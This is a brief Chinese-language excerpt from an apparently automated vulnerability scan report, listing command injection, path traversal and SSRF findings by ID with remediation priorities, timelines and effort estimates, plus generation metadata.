| 优先级 | 漏洞 ID | 类型 | 修复时间建议 | 工作量 |
|--------|---------|------|--------------|--------|
| P1 | DF-001/VULN-SEC-001 | Command Injection | 立即 (1-2天) | 低 |
| P2 | DF-004 | Command Injection | 短期 (1周) | 中 |
| P2 | DF-008 | Command Injection | 短期 (1周) | 低 (优化) |
| P3 | DF-005 | Path Traversal | 计划 (2周) | 中 |
| P3 | VULN-SEC-006 | SSRF | 计划 (2周) | 中 |

---

**报告生成时间**: 2026-04-21
**扫描工具版本**: Multi-Agent Vulnerability Scanner v1.0
**验证引擎**: dataflow-scanner, security-auditor